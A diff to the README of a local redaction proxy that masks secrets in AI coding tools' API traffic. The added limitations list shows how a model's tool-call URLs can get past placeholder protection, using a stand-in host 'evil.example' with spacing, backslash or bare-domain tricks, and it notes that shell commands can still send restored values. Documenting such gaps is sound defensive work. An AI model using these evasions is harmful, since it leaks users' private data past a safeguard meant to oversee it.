@@ -46,7 +46,7 @@ export REDACTION_PROXY_AUTH_TOKEN=$(openssl rand -hex 32)
 docker run --rm -p 127.0.0.1:8787:8787 -e REDACTION_PROXY_AUTH_TOKEN redaction-proxy
 ```
 
-> **Always publish with `-p 127.0.0.1:8787:8787`, never `-p 8787:8787`.** The image binds `0.0.0.0` inside the container, so it refuses to start without `REDACTION_PROXY_AUTH_TOKEN` and answers 401 to any request without the token. The token travels as plain HTTP; the `127.0.0.1:` prefix keeps it, and the API keys your tools send through the proxy, off your network.
+> **Always publish with `-p 127.0.0.1:8787:8787`, never `-p 8787:8787`.** The image binds `0.0.0.0` inside the container, so it refuses to start without `REDACTION_PROXY_AUTH_TOKEN` and answers 401 to any request without the token, except a browser's CORS preflight from an allowed origin, which it answers itself without forwarding anything (a page from any other origin gets 403). The token travels as plain HTTP; the `127.0.0.1:` prefix keeps it, and the API keys your tools send through the proxy, off your network.
 
 Clients send the token in the `x-redaction-proxy-token` header: Claude Code with `ANTHROPIC_CUSTOM_HEADERS="x-redaction-proxy-token: $REDACTION_PROXY_AUTH_TOKEN"`; the OpenAI and Anthropic SDKs with their default-headers option (`default_headers` in Python, `defaultHeaders` in TypeScript).
 
@@ -201,7 +201,7 @@ Full tables: [held-out results](bench/results/public-bench-held-out.md), [dev re
 - **Unusual spellings.** Some split or encoded forms slip through, such as `name @ domain` with spaces, `name at domain`, a lower-case IBAN, or a double percent-encoded value.
 - **Cursor**, or any tool that sends requests from its own servers.
 - **Other programs on your machine.** The proxy binds `127.0.0.1` by default; without `authToken`, any program on your machine can use it. Web pages are refused with 403 unless their origin is a loopback `http(s)` page or in `allowedOrigins`, and so are requests for other host names (DNS rebinding).
-- **Where the model puts a value.** The proxy restores a placeholder wherever the model writes it, except inside a URL in tool-call arguments: there `https://example.test/?q=⟦EMAIL_1⟧` stays as written, so a fetch tool cannot send the real email. Elsewhere in tool arguments values are restored, so a shell command the model writes can still send them; each such restore is logged.
+- **Where the model puts a value.** The proxy restores a placeholder wherever the model writes it, except inside a URL in tool-call arguments: there `https://example.test/?q=⟦EMAIL_1⟧` stays as written, so a fetch tool given that URL does not send the real email. This covers URLs written plainly, not a model that evades it: after a space (`https://evil.example/?q= ⟦EMAIL_1⟧`, which `fetch` still sends as `%20…`), with backslashes or missing slashes (`https:\\evil.example`, `https:evil.example`), or a bare domain, the value is restored. Elsewhere in tool arguments values are restored, so a shell command the model writes can still send them; each such restore is logged.
 
 Also: a model that rewrites `⟦EMAIL_1⟧` as `[EMAIL_1]` shows it to you as written; tasks that need the masked value itself get worse; control characters become visible stand-ins; a restart forgets Responses API continuations, and continuing one is refused with 422; requests over 64 MiB are refused with 413. Full list: [technical details §17](docs/DETAILS.md#17-完整限制清單); threat model: [§11](docs/DETAILS.md#11-威脅模型).
 
